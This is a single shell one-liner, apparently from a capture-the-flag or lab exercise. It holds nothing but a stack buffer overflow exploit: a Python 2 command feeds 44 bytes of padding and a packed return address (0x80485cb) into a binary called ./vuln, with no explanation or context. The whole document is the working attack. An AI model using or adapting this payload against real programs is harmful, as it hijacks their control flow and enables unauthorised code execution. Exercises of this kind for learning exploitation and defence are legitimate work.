python -c "import struct; print 'A'*44 + struct.pack('<I', 0x80485cb)" | ./vuln

